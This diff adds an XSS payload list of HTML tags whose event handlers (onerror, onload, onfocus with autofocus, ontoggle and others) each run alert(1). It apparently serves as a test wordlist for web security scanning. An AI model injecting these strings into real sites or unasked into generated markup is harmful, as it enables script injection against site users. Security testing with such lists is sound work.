@@ -1,0 +1,38 @@
+# Event handler based XSS payloads
+# Mouse events
+<div onmouseover=alert(1)>XSS</div>
+<div onmouseout=alert(1)>XSS</div>
+<div onmousedown=alert(1)>XSS</div>
+<div onmouseup=alert(1)>XSS</div>
+<div onclick=alert(1)>XSS</div>
+<div ondblclick=alert(1)>XSS</div>
+
+# Keyboard events
+<input onkeydown=alert(1)>
+<input onkeyup=alert(1)>
+<input onkeypress=alert(1)>
+
+# Form events
+<form onsubmit=alert(1)><input type=submit></form>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus>
+<input onchange=alert(1)>
+<select onchange=alert(1)><option>1</option></select>
+
+# Window events
+<body onload=alert(1)>
+<body onunload=alert(1)>
+<body onresize=alert(1)>
+<body onscroll=alert(1)>
+
+# Media events
+<video onloadstart=alert(1)><source></video>
+<audio onloadstart=alert(1)><source></audio>
+<img onload=alert(1) src=x>
+<img onerror=alert(1) src=x>
+
+# Other events
+<details ontoggle=alert(1) open>
+<marquee onstart=alert(1)>XSS</marquee>
+<div onanimationstart=alert(1) style="animation:spin 1s">
+<div ontransitionend=alert(1) style="transition:all 1s" onmouseover=this.style.color="red">
